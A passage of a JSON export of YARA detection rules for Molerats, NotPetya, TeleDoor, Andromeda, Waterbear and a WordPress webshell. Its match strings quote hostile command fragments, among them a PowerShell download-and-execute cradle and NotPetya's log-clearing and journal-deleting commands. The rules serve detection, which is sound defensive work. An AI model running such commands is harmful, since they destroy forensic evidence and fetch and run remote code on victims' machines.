12:36:41","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_lpe_2_RID305D","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"4be7ec131429441e2e73969fa43fa0c4","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_1_RID2F9B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-07-07 12:04:21","description":"Detects Molerats sample - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_1_RID2F9B","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"3117cbf745781fbe3c26bbfdf53cbf98","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_2_RID2F9C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Folder.exe\" fullword ascii\n      $s2 = \"Notepad++.exe\" fullword wide\n      $s3 = \"RSJLRSJOMSJ\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-07-07 12:04:31","description":"Detects Molerats sample - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_2_RID2F9C","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"16a2418c27160a53343f97099d256e4a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_3_RID2F9D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ccleaner.exe\" fullword wide\n      $s2 = \"Folder.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}","date":"2017-07-07 12:04:41","description":"Detects Molerats sample - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_3_RID2F9D","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"b5747f67d12cbcb2a2a045682b624f9d","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_4_RID2F9E : APT DEMO {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"get-itemproperty -path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\' -name 'KeyName')\" wide\n      $x2 = \"O.Run C & chrw(34) & \\\"[System.IO.File]::\" wide\n      $x3 = \"HKCU\\\\SOFTWARE\\\\Microsoft\\\\\\\\KeyName\\\"\" fullword wide\n   condition: \n      ( filesize < 700KB and 1 of them )\n}","date":"2017-07-07 12:04:51","description":"Detects Molerats sample - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_4_RID2F9E","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"b4dbd8f8f1b0eb0219e0e9ae65b3c358","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_5_RID2F9F : APT DEMO T1105 {\n   meta:\n      description = \"Detects Molerats sample - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell.exe -nop -c \\\"iex\" nocase ascii\n      $x2 = \".run('%windir%\\\\\\\\SysWOW64\\\\\\\\WindowsPowerShell\\\\\\\\\" ascii\n      $a1 = \"Net.WebClient).DownloadString\" nocase ascii\n      $a2 = \"gist.githubusercontent.com\" nocase ascii\n   condition: \n      filesize < 200KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2017-07-07 12:05:01","description":"Detects Molerats sample - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_5_RID2F9F","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"385465559106ad34b2972f6a51e161fc","score":75,"tags":["APT","DEMO","T1105"]},{"author":"Florian Roth","content":"rule Molerats_Jul17_Sample_Dropper_RID3246 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Molerats sample dropper SFX - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html\"\n      date = \"2017-07-07 13:58:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Please remove %s from %s folder. It is unsecure to run %s until it is done.\" fullword wide\n      $s2 = \"sfxrar.exe\" fullword ascii\n      $s3 = \"attachment.hta\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-07-07 13:58:11","description":"Detects Molerats sample dropper SFX - July 2017","minimum_yara":"1.7","name":"Molerats_Jul17_Sample_Dropper_RID3246","reference":"https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html","required_modules":[],"rule_hash":"ad1a843dde919afb56a7c4661b62651f","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TeleDoor_Backdoor_RID2DB3 : DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects the TeleDoor Backdoor as used in Petya Attack in June 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/CpfJQQ\"\n      date = \"2017-07-05 10:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = { 50 61 79 6C 6F 61 64 00 41 75 74 6F 50 61 79 6C 6F 61 64 } \n      $c2 = { 52 75 6E 43 6D 64 00 44 75 6D 70 44 61 74 61 } \n      $c3 = { 00 5A 76 69 74 57 65 62 43 6C 69 65 6E 74 45 78 74 00 4D 69 6E 49 6E 66 6F } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 2 of them )\n}","date":"2017-07-05 10:43:01","description":"Detects the TeleDoor Backdoor as used in Petya Attack in June 2017","minimum_yara":"1.7","name":"TeleDoor_Backdoor_RID2DB3","reference":"https://goo.gl/CpfJQQ","required_modules":[],"rule_hash":"5c47701790d58c1a3dc110c11d0f6bc4","score":75,"tags":["DEMO","EXE","RANSOM","FILE","MAL"]},{"author":"Florian Roth","content":"rule Andromeda_MalBot_Jun_1A_RID2F97 : DEMO EXE FILE MAL T1060 {\n   meta:\n      description = \"Detects a malicious Worm Andromeda / RETADUP\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/information-stealer-found-hitting-israeli-hospitals/\"\n      date = \"2017-06-30 12:03:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%temp%\\\\FolderN\\\\name.exe\" fullword wide\n      $x2 = \"%temp%\\\\FolderN\\\\name.exe.lnk\" fullword wide\n      $x3 = \"\\\\Startup\\\\name.exe\" fullword wide\n      $x4 = \"firefox.exe.exe\" fullword wide\n      $x5 = \"\\\\Desktop\\\\New folder\\\\dark.exe\" fullword wide\n      $x6 = \"\\\\x86\\\\Release\\\\word.pdb\" fullword ascii\n      $x7 = \"\\\\obj\\\\Release\\\\botkill.pdb\" fullword ascii\n      $s1 = \"4System.Web.Services.Protocols.SoapHttpClientProtocol\" fullword ascii\n      $s2 = \"svhost.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2017-06-30 12:03:41","description":"Detects a malicious Worm Andromeda / RETADUP","minimum_yara":"1.7","name":"Andromeda_MalBot_Jun_1A_RID2F97","reference":"http://blog.trendmicro.com/trendlabs-security-intelligence/information-stealer-found-hitting-israeli-hospitals/","required_modules":[],"rule_hash":"a026ee9dacea76c4e319616f81223bce","score":75,"tags":["DEMO","EXE","T1060","FILE","MAL"]},{"author":"Florian Roth","content":"rule NotPetya_Ransomware_Jun17_RID30B7 : CRIME DEMO EXE FILE MAL RANSOM T1053 T1085 {\n   meta:\n      description = \"Detects new NotPetya Ransomware variant from June 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/h6iaGj\"\n      date = \"2017-06-27 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM, T1053, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Ooops, your important files are encrypted.\" fullword wide ascii\n      $x2 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\\\\"C:\\\\Windows\\\\%s\\\\\\\" #1 \" fullword wide\n      $x3 = \"-d C:\\\\Windows\\\\System32\\\\rundll32.exe \\\"C:\\\\Windows\\\\%s\\\",#1 \" fullword wide\n      $x4 = \"Send your Bitcoin wallet ID and personal installation key to e-mail \" fullword wide\n      $x5 = \"fsutil usn deletejournal /D %c:\" fullword wide\n      $x6 = \"wevtutil cl Setup & wevtutil cl System\" ascii\n      $x7 = { 2C 00 23 00 31 00 20 00 00 00 00 00 00 00 00 00 72 00 75 00 6E\n         00 64 00 6C 00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 } \n      $s1 = \"%s /node:\\\"%ws\\\" /user:\\\"%ws\\\" /password:\\\"%ws\\\" \" fullword wide\n      $s4 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n      $s5 = \"schtasks %ws/Create /SC once /TN \\\"\\\" /TR \\\"%ws\\\" /ST %02d:%02d\" fullword wide\n      $s6 = \"u%s \\\\\\\\%s -accepteula -s \" fullword wide\n      $s7 = \"dllhost.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2017-06-27 12:51:41","description":"Detects new NotPetya Ransomware variant from June 2017","minimum_yara":"1.7","name":"NotPetya_Ransomware_Jun17_RID30B7","reference":"https://goo.gl/h6iaGj","required_modules":[],"rule_hash":"56e424166ceac048d264f950d1ecf6ac","score":75,"tags":["RANSOM","MAL","DEMO","EXE","T1053","FILE","T1085","CRIME"]},{"author":"Florian Roth","content":"rule PowerShell_in_Word_Doc_RID2FBC : DEMO FILE MAL OFFICE SCRIPT T1086 {\n   meta:\n      description = \"Detects a powershell and bypass keyword in a Word document\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - ME\"\n      date = \"2017-06-27 12:09:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, OFFICE, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"POwErSHELl.ExE\" fullword ascii nocase\n      $s2 = \"BYPASS\" fullword ascii nocase\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 1000KB and all of them )\n}","date":"2017-06-27 12:09:51","description":"Detects a powershell and bypass keyword in a Word document","minimum_yara":"1.7","name":"PowerShell_in_Word_Doc_RID2FBC","reference":"Internal Research - ME","required_modules":[],"rule_hash":"54f05e36c14d39ad8b83b7bbc4bd8ce0","score":50,"tags":["OFFICE","SCRIPT","MAL","DEMO","T1086","FILE"]},{"author":"Florian Roth","content":"rule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE OFFICE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-25 15:44:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OFFICE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \" * @package WordPress\" fullword ascii\n      $s1 = \"define('DB_NAME',\" ascii\n      $s2 = \"require_once(ABSPATH . 'wp-settings.php');\" ascii\n      $fp1 = \"iThemes Security Config\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )\n}","date":"2017-06-25 15:44:21","description":"Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it","minimum_yara":"1.7","name":"Wordpress_Config_Webshell_Preprend_RID34C3","reference":"Internal Research","required_modules":[],"rule_hash":"497072fdd28e57d7884131d3bf1e52f9","score":65,"tags":["T1100","OFFICE","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule Waterbear_1_Jun17_RID2D32 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\svc.pdb\" ascii\n      $s2 = \"svc.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-06-23 10:21:31","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_1_Jun17_RID2D32","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"da12e8bbdb9bff68563dc29b4f30f379","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_6_Jun17_RID2D37 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svcdll.dll\" fullword ascii\n      $s2 = \"log.log\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}","date":"2017-06-23 10:22:21","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_6_Jun17_RID2D37","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"b00343474b1d8b5aef8ae573c18f0fb1","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_10_Jun17_RID2D62 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ADVPACK32.DLL\" fullword wide\n      $s5 = \"ADVPACK32\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}","date":"2017-06-23 10:29:31","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_10_Jun17_RID2D62","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"f02572c4f1f22fa9d537891c9487ac62","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_12_Jun17_RID2D64 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"O_PROXY\" fullword ascii\n      $s2 = \"XMODIFY\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-06-23 10:29:51","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_12_Jun17_RID2D64","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"ece90c9469f607af6ed978fadd8fedc6","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_14_Jun17_RID2D66 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"my.com/msg/util/sgthash\" fullword ascii\n      $s2 = \"C:\\\\recycled\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and all of them )\n}","date":"2017-06-23 10:30:11","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_14_Jun17_RID2D66","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"9d3a60f21dd5273b0f1112e597aa5e5a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_2_Jun17_RID2D33 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"downloading movie\" fullword ascii\n      $s2 = \"name=\\\"test.exe\\\"/>\" fullword ascii\n      $s3 = \"<description>Test Application</description>\" fullword ascii\n      $s4 = \"UI look 2003\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-06-23 10:21:41","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_2_Jun17_RID2D33","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"39befe16ad2f4728465eccc6f1a2d12b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_4_Jun17_RID2D35 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)\" fullword ascii\n      $s1 = \"Wininet.dll InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA HttpQueryInfoA InternetReadFile InternetCloseHandle\" fullword ascii\n      $s2 = \"read from pipe:%s\" fullword ascii\n      $s3 = \"delete pipe\" fullword ascii\n      $s4 = \"cmdcommand:%s\" fullword ascii\n      $s5 = \"%s /c del %s\" fullword ascii\n      $s6 = \"10.0.0.250\" fullword ascii\n      $s7 = \"Vista/2008\" fullword ascii\n      $s8 = \"%02X%02X%02X%02X%02X%02X%04X\" fullword ascii\n      $s9 = \"UNKOWN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}","date":"2017-06-23 10:22:01","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_4_Jun17_RID2D35","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"bb28036a98c272612c684e85668f5bf5","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_5_Jun17_RID2D36 : DEMO FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"ICESWORD\" fullword ascii\n      $a2 = \"klog.dat\" fullword ascii\n      $s1 = \"\\\\cswbse.dll\" fullword ascii\n      $s2 = \"WIRESHARK\" fullword ascii\n      $s3 = \"default_zz|\" fullword ascii\n      $s4 = \"%c4%u-%.2u-%.2u %.2u:%.2u\" fullword ascii\n      $s5 = \"1111%c%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3d53 and filesize < 100KB and ( all of ( $a* ) or 3 of them ) )\n}","date":"2017-06-23 10:22:11","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_5_Jun17_RID2D36","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"33eeb76f3e9e7258d5dfc9386ad446a9","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_7_Jun17_RID2D38 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bluthmon.exe\" fullword wide\n      $s2 = \"Motomon.exe\" fullword wide\n      $s3 = \"%d.%s%d%d%d\" fullword ascii\n      $s4 = \"mywishes.hlp\" fullword ascii\n      $s5 = \"filemon.rtf\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-06-23 10:22:31","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_7_Jun17_RID2D38","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"c7f8a0b016f37ee4d13e643269b7ba0b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_8_Jun17_RID2D39 : DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Update.dll\" fullword ascii\n      $s2 = \"ADVPACK32.DLL\" fullword wide\n      $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" fullword ascii\n      $s4 = \"\\\\drivers\\\\sftst.sys\" fullword ascii\n      $s5 = \"\\\\\\\\.\\\\SFilter\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}","date":"2017-06-23 10:22:41","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_8_Jun17_RID2D39","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"bcb9155330b570c1c0644cd7f6678bb2","score":75,"tags":["DEMO","EXE","T1050","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_9_Jun17_RID2D3A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ADVPACK32.DLL\" fullword wide\n      $s2 = \"ADVPACK32\" fullword wide\n      $a1 = \"U2_Dll.dll\" fullword ascii\n      $b1 = \"ProUpdate\" fullword ascii\n      $b2 = \"Update.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of ( $s* ) and ( $a1 or all of ( $b* ) )\n}","date":"2017-06-23 10:22:51","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_9_Jun17_RID2D3A","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"3224ffea601940bad27ab05940c6dfa9","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_11_Jun17_RID2D63 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/Pages/%u.asp\" fullword wide\n      $s2 = \"NVIDIA Corporation.\" fullword wide\n      $s3 = \"tqxbLc|fP_{eOY{eOX{eO\" fullword ascii\n      $s4 = \"Copyright (C) 2005\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-06-23 10:29:41","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_11_Jun17_RID2D63","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"e7f5e5affa5ea61578175717212adca7","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Waterbear_13_Jun17_RID2D65 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/L9g9eR\"\n      date = \"2017-06-23 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%WINDIR%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\pchsvc.dll\" fullword ascii\n      $s2 = \"brnew.exe\" fullword ascii\n      